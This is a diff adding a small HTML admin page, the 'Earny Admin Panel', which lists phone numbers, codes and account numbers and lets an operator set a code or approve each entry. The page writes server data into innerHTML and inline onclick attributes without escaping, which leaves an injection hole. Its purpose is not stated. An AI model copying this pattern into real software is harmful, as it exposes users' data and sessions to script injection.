@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Earny Admin</title>
+<style>
+body { font-family: Arial, sans-serif; background:#eef1ff; padding:20px; }
+h2 { text-align:center; color:#4f7cff; }
+table { width:100%; background:white; border-radius:10px; overflow:hidden; box-shadow:0 5px 20px rgba(0,0,0,0.1); margin-top:20px; }
+th, td { padding:12px; border-bottom:1px solid #ddd; text-align:center; }
+th { background:#4f7cff; color:white; }
+input { padding:6px; border-radius:5px; border:1px solid #4f7cff; }
+button { padding:6px 10px; background:#4f7cff; color:white; border:none; border-radius:5px; cursor:pointer; }
+button:hover { background:#3d64d8; }
+</style>
+</head>
+<body>
+
+<h2>Earny Admin Panel</h2>
+<table id="table"></table>
+
+<script>
+async function loadRequests(){
+    const res = await fetch("/api/requests");
+    const data = await res.json();
+    const table = document.getElementById("table");
+    table.innerHTML=`<tr><th>Phone</th><th>Code</th><th>Set Code</th><th>Code Used</th><th>Approve</th><th>Account Number</th></tr>`;
+    data.forEach(r=>{
+        table.innerHTML+=`
+        <tr>
+        <td>${r.phone}</td>
+        <td>${r.code||"-"}</td>
+        <td><input id="c-${r.phone}" placeholder="code"><button onclick="setCode('${r.phone}')">Save</button></td>
+        <td>${r.codeUsed}</td>
+        <td><button onclick="approve('${r.phone}')">Approve</button></td>
+        <td>${r.accountNumber||"-"}</td>
+        </tr>`;
+    });
+}
+async function setCode(phone){
+    const code=document.getElementById("c-"+phone).value;
+    await fetch("/api/setcode",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code})});
+    loadRequests();
+}
+async function approve(phone){
+    await fetch("/api/approve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})});
+    loadRequests();
+}
+loadRequests();
+</script>
+
+</body>
+</html>
